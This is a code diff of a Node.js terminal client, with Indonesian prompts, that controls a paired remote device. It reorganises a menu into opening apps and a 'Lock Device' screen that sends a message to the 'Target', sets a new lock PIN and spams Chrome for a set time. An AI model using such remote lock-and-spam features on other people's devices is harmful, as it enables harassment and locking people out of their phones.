@@ -293,8 +293,7 @@ function renderApps(apps, page, source) {
 
   console.log(GREEN + 'Ketik nomor aplikasi untuk membuka.' + RESET);
   console.log(GREEN + '[n] Next   [p] Previous   [r] Refresh' + RESET);
-  console.log(GREEN + '[l] Activate Local Lock   [u] Unlock' + RESET);
-  console.log(GREEN + '[0] Disconnect' + RESET);
+  console.log(GREEN + '[b] Back to feature menu' + RESET);
 }
 
 async function session(mode) {
@@ -387,114 +386,146 @@ async function session(mode) {
       source = result.source || 'launcher';
     }
 
-    await refresh();
-
-    if (!apps.length) {
-      console.log(YELLOW + 'Tidak ada aplikasi ditemukan.' + RESET);
-      return;
-    }
-
-    let page = 0;
-
     while (true) {
       banner();
+      console.log(GREEN + '[CONNECTED] REMOTE DEVICE • ' + mode + RESET);
+      console.log('');
+      console.log(GREEN + '========================================' + RESET);
+      console.log(GREEN + '              PILIH FITUR' + RESET);
+      console.log(GREEN + '========================================' + RESET);
+      console.log('[1] OPEN APP');
+      console.log('[2] LOCK DEVICE');
+      console.log('[0] DISCONNECT');
+      const feature = (await ask('PILIH FITUR > ')).trim();
 
-      console.log(
-        \`\${GREEN}[CONNECTED]\${RESET} REMOTE DEVICE • \${mode}\`
-      );
+      if (feature === '0') break;
 
-      renderApps(apps, page, source);
-
-      const choice = (
-        await ask('\nDUAL CONTROL > ')
-      ).trim().toLowerCase();
-
-      if (choice === 'l') {
-        const message = await ask('Pesan untuk Target (maks. 500 karakter): ');
-        const rawDuration = (await ask('Durasi uji Chrome (5-30 detik): ')).trim();
-        const durationSeconds = Number(rawDuration);
-        if (!/^\\d+$/.test(rawDuration) || durationSeconds < 5 || durationSeconds > 30) {
-          console.log(YELLOW + 'Durasi harus 5 sampai 30 detik.' + RESET);
+      if (feature === '1') {
+        try {
+          await refresh();
+        } catch (e) {
+          console.log(RED + e.message + RESET);
+          await ask('Enter...');
+          continue;
+        }
+        if (!apps.length) {
+          console.log(YELLOW + 'Tidak ada aplikasi ditemukan.' + RESET);
           await ask('Enter untuk kembali...');
           continue;
         }
-        const result = await channel.request({
-          type: 'lock',
-          token,
-          message: message.slice(0, 500),
-          durationSeconds
-        });
-        console.log(result.ok ? GREEN + '[LOCK ACTIVE] ' + result.message + RESET : RED + '[FAILED] ' + (result.message || 'Gagal mengaktifkan lock.') + RESET);
-        await ask('Enter untuk kembali...');
+        let page = 0;
+        while (true) {
+          banner();
+          console.log(GREEN + '[CONNECTED] REMOTE DEVICE • ' + mode + RESET);
+          renderApps(apps, page, source);
+          const choice = (await ask('\\nOPEN APP > ')).trim().toLowerCase();
+
+          if (choice === 'b' || choice === '0') break;
+          if (choice === 'n') {
+            page = Math.min(page + 1, Math.ceil(apps.length / PAGE_SIZE) - 1);
+            continue;
+          }
+          if (choice === 'p') {
+            page = Math.max(0, page - 1);
+            continue;
+          }
+          if (choice === 'r') {
+            try { await refresh(); page = 0; }
+            catch (e) { console.log(RED + e.message + RESET); await ask('Enter...'); }
+            continue;
+          }
+          if (!/^\\d+$/.test(choice)) {
+            console.log('Masukkan nomor aplikasi atau b untuk kembali.');
+            await ask('Enter...');
+            continue;
+          }
+          const number = Number(choice);
+          if (number < 1 || number > apps.length) {
+            console.log(RED + 'Nomor tidak tersedia.' + RESET);
+            await ask('Enter...');
+            continue;
+          }
+          const app = apps[number - 1];
+          console.log('\\nOPENING: ' + app.name);
+          const result = await channel.request({ type: 'open_app', token, package: app.package });
+          console.log(result.ok ? GREEN + '[OK] ' + RESET : RED + '[FAILED] ' + RESET);
+          console.log(result.message || result.error || '');
+          await ask('\\nEnter untuk kembali ke daftar...');
+        }
         continue;
       }
 
-      if (choice === 'u') {
-        const result = await channel.request({ type: 'unlock', token });
-        console.log(result.ok ? GREEN + '[UNLOCKED] ' + result.message + RESET : RED + '[FAILED] ' + (result.message || 'Gagal menonaktifkan lock.') + RESET);
-        await ask('Enter untuk kembali...');
-        continue;
-      }
+      if (feature === '2') {
+        const message = (await ask('Pesan untuk Target (maks. 500 karakter): ')).slice(0, 500);
+        const newPin = (await ask('PIN LOCK BARU (4 digit, berbeda dari PIN pairing): ')).trim();
+        if (!/^\\d{4}$/.test(newPin)) {
+          console.log(RED + 'PIN Lock harus tepat 4 digit.' + RESET);
+          await ask('Enter untuk kembali...');
+          continue;
+        }
+        const rawDuration = (await ask('Batasan spam open Chrome (5-30 detik): ')).trim();
+        const durationSeconds = Number(rawDuration);
+        if (!/^\\d+$/.test(rawDuration) || durationSeconds < 5 || durationSeconds > 30) {
+          console.log(RED + 'Durasi harus 5 sampai 30 detik.' + RESET);
+          await ask('Enter untuk kembali...');
+          continue;
+        }
 
-      if (choice === '0') break;
-
-      if (choice === 'n') {
-        page = Math.min(
-          page + 1,
-          Math.ceil(apps.length / PAGE_SIZE) - 1
-        );
-        continue;
-      }
-
-      if (choice === 'p') {
-        page = Math.max(0, page - 1);
-        continue;
-      }
-
-      if (choice === 'r') {
+        let lockActive = false;
+        async function setLock() {
+          const result = await channel.request({
+            type: 'lock', token, message, pin: newPin, durationSeconds
+          });
+          if (!result.ok) throw new Error(result.message || 'Gagal mengaktifkan Lock Device.');
+          lockActive = true;
+          console.log(GREEN + result.message + RESET);
+        }
         try {
-          await refresh();
-          page = 0;
+          await setLock();
         } catch (e) {
           console.log(RED + e.message + RESET);
+          await ask('Enter untuk kembali...');
+          continue;
+        }
+
+        // Tetap berada di layar Lock Device setelah MULAI; status dan kontrol tidak
+        // otomatis kembali ke menu utama.
+        while (true) {
+          banner();
+          console.log(GREEN + '========================================' + RESET);
+          console.log(GREEN + '               LOCK DEVICE' + RESET);
+          console.log(GREEN + '========================================' + RESET);
+          console.log('STATUS : ' + (lockActive ? GREEN + 'LOCK ACTIVE' : YELLOW + 'UNLOCKED') + RESET);
+          console.log('PIN    : tersimpan untuk sesi Lock ini');
+          console.log('Chrome : pengulangan dibatasi ' + durationSeconds + ' detik');
+          console.log('');
+          console.log('[1] LOCK');
+          console.log('[2] UNLOCK');
+          console.log('[0] KEMBALI');
+          const lockChoice = (await ask('LOCK DEVICE > ')).trim();
+          if (lockChoice === '0') break;
+          if (lockChoice === '1') {
+            try { await setLock(); }
+            catch (e) { console.log(RED + e.message + RESET); await ask('Enter...'); }
+            continue;
+          }
+          if (lockChoice === '2') {
+            try {
+              const result = await channel.request({ type: 'unlock', token });
+              lockActive = false;
+              console.log(result.ok ? GREEN + result.message + RESET : RED + result.message + RESET);
+            } catch (e) { console.log(RED + e.message + RESET); }
+            await ask('Enter untuk lanjut...');
+            continue;
+          }
+          console.log('Pilihan tidak valid.');
           await ask('Enter...');
         }
         continue;
       }
 
-      if (!/^\d+$/.test(choice)) {
-        console.log('Masukkan nomor aplikasi.');
-        await ask('Enter...');
-        continue;
-      }
-
-      const number = Number(choice);
-
-      if (number < 1 || number > apps.length) {
-        console.log(RED + 'Nomor tidak tersedia.' + RESET);
-        await ask('Enter...');
-        continue;
-      }
-
-      const app = apps[number - 1];
-
-      console.log(\`\nOPENING: \${app.name}\`);
-
-      const result = await channel.request({
-        type: 'open_app',
-        token,
-        package: app.package
-      });
-
-      console.log(
-        result.ok
-          ? GREEN + '[OK] ' + RESET
-          : RED + '[FAILED] ' + RESET
-      );
-
-      console.log(result.message);
-
-      await ask('\nEnter untuk kembali ke daftar...');
+      console.log('Pilihan tidak valid.');
+      await ask('Enter...');
     }
   } finally {
     socket.end();
